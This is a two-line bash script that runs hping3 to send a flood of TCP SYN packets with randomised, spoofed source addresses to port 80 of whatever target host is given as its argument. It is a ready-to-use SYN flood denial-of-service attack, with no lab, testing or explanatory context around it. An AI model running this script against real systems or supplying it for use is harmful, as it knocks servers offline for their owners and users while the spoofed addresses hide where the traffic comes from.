#!/bin/bash
hping3 -S --flood --rand-source -V -p 80 "$1"
